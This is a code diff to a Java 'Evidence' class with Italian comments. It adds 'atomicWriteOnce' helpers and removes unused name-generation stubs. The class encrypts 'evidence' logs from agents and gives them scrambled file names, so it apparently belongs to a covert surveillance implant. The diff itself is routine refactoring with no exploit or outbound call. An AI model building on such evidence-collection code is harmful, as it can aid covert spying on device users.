@@ -68,7 +68,7 @@ public final class Evidence {
      */
 
     public static final int EVIDENCE_MAGIC_CALLTYPE = 0x0026;
-    
+
     public static int EVIDENCE_DELIMITER = 0xABADC0DE;
 
     public static final int[] TYPE_EVIDENCE = new int[] {
@@ -285,7 +285,7 @@ public final class Evidence {
             return false;
         }
 
-        final Vector tuple = evidenceCollector.makeNewName(this, onSD);
+        final Vector tuple = evidenceCollector.makeNewName(this, logType, onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -461,44 +461,6 @@ public final class Evidence {
         return plainBuffer;
     }
 
-    /**
-     * Override della funzione precedente: invece di generare il nome da una
-     * stringa lo genera da un numero. Se la chiamata fallisce la funzione torna
-     * una stringa vuota.
-     * 
-     * @param agentId
-     *            the agent id
-     * @param addPath
-     *            the add path
-     * @return the string
-     */
-    String makeName(final int agentId, final boolean addPath) {
-        return null;
-    }
-
-    /**
-     * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il
-     * nome ritornato e' completo del path da utilizzare altrimenti viene
-     * ritornato soltanto il nome. Se la chiamata fallisce la funzione torna una
-     * stringa vuota. Il nome generato non indica necessariamente un file che
-     * gia' non esiste sul filesystem, e' compito del chiamante verificare che
-     * tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC
-     * e' impostato a TRUE viene generato un nome che punta alla prima MMC
-     * disponibile, se esiste.
-     * 
-     * @param name
-     *            the name
-     * @param addPath
-     *            the add path
-     * @param storeToMMC
-     *            the store to mmc
-     * @return the string
-     */
-    String makeName(final String name, final boolean addPath,
-            final boolean storeToMMC) {
-        return null;
-    }
-
     public synchronized byte[] plainEvidence(final byte[] additionalData,
             final int logType, final byte[] data) {
 
@@ -589,19 +551,6 @@ public final class Evidence {
     }
 
     /**
-     * Write log.
-     * 
-     * @param data
-     *            the data
-     * @param endzero
-     *            the endzero
-     * @return true, if successful
-     */
-    public boolean writeEvidence(final String data, final boolean endzero) {
-        return writeEvidence(WChar.getBytes(data, endzero));
-    }
-
-    /**
      * Write logs.
      * 
      * @param bytelist
@@ -636,9 +585,8 @@ public final class Evidence {
             final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false,
                     Encryption.getKeys().getAesKey());
 
-            logInfo.createEvidence(null);
-            logInfo.writeEvidence(message, true);
-            logInfo.close();
+            logInfo.atomicWriteOnce(message);
+
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error(ex);
@@ -646,4 +594,34 @@ public final class Evidence {
         }
     }
 
+    public synchronized void atomicWriteOnce(byte[] additionalData, byte[] content) {
+        createEvidence(additionalData);
+        writeEvidence(content);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(Vector bytelist) {
+        createEvidence(null);
+        writeEvidences(bytelist);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(byte[] plain) {
+        createEvidence(null);
+        writeEvidence(plain);
+        close();
+    }
+
+    public synchronized void atomicWriteOnce(String string) {
+        createEvidence(null);
+        writeEvidence(WChar.getBytes(string, true));
+        close();
+    }
+
+    public void atomicWriteOnce(byte[] additionalData, int logType,
+            byte[] content) {
+        createEvidence(additionalData, logType);
+        writeEvidence(content);
+        close();
+    }
 }
